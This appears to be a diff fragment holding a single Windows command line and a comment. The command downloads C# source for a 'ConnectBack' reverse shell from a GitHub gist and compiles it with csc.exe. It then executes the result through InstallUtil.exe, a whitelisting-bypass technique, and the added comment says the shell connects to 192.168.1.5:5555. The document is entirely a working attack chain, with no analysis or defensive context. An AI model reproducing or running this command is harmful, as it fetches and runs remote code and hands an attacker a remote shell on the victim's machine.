@@ -1,1 +1,3 @@
 cd %temp% && powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('https://gist.githubusercontent.com/analyticsearch/98ccdaf534f63888e0adf315c3778e7d/raw/34cd0b1950937cad5f28a39bf7c6575b9b23d29a/','ConnectBack.cs'); && cd c:\Windows\Microsoft.NET\Framework64\v4.* && csc.exe /unsafe /reference:System.IO.Compression.dll /out:ConnectBack.exe %temp%\\ConnectBack.cs && InstallUtil.exe /logfile= /LogToConsole=false /U ConnectBack.exe && ConnectBack.exe
+
+*** By default above reverse shell connects to 192.168.1.5:5555 ***
